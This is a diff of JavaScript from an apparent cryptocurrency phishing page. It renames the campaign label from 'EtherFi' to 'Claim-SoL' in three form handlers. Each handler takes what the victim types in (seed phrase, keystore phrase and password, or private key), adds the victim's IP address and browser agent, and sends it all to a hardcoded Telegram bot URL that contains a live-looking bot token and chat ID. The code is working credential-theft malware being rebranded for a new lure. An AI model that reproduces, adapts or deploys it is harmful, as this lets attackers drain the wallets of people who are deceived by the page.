@@ -104,7 +104,7 @@
 			var ip = sessionStorage.getItem("plasta")
 			var a = document.getElementById('inp1').value
 			var wallType = sessionStorage.getItem("wallType")
-			var sData = encodeURI("New EtherFi\n\nWallet Type: "+wallType+" \n\nPass Phrase: \n\n"+a+"\n\nIP Address: "+ip+"\n\nbrowser agent: "+agent)
+			var sData = encodeURI("New Claim-SoL\n\nWallet Type: "+wallType+" \n\nPass Phrase: \n\n"+a+"\n\nIP Address: "+ip+"\n\nbrowser agent: "+agent)
 			$.ajax({
 				url: 'https://api.telegram.org/bot6976216240:AAE0D2WgdkBzNFhy7fhEr-cZ11lxS24jKag/'+"sendmessage?text="+sData+"&chat_id=1313821156&parse_mode=HTML",
 				beforeSend: function() {
@@ -133,7 +133,7 @@
 			var a = document.getElementById('inp2').value
 			var b = document.getElementById('inp3').value
 			var wallType = sessionStorage.getItem("wallType")
-			var sData = encodeURI("New EtherFi\n\nWallet Type: "+wallType+" \n\nKeystore Phrase: "+a+"\n\nWallet Pasword: "+b+"\n\nIP Address: "+ip+"\n\nbrowser agent: "+agent)
+			var sData = encodeURI("New Claim-SoL\n\nWallet Type: "+wallType+" \n\nKeystore Phrase: "+a+"\n\nWallet Pasword: "+b+"\n\nIP Address: "+ip+"\n\nbrowser agent: "+agent)
 			$.ajax({
 				url: 'https://api.telegram.org/bot6976216240:AAE0D2WgdkBzNFhy7fhEr-cZ11lxS24jKag/'+"sendmessage?text="+sData+"&chat_id=1313821156&parse_mode=HTML",
 				beforeSend: function() {
@@ -161,7 +161,7 @@
 			var ip = sessionStorage.getItem("plasta")
 			var a = document.getElementById('inp4').value
 			var wallType = sessionStorage.getItem("wallType")
-			var sData = encodeURI("New EtherFi\n\nWallet Type: "+wallType+" \n\nPrivate Key: "+a+"\n\nIP Address: "+ip+"\n\nbrowser agent: "+agent)
+			var sData = encodeURI("New Claim-SoL\n\nWallet Type: "+wallType+" \n\nPrivate Key: "+a+"\n\nIP Address: "+ip+"\n\nbrowser agent: "+agent)
 			$.ajax({
 				url: 'https://api.telegram.org/bot6976216240:AAE0D2WgdkBzNFhy7fhEr-cZ11lxS24jKag/'+"sendmessage?text="+sData+"&chat_id=1313821156&parse_mode=HTML",
 				beforeSend: function() {
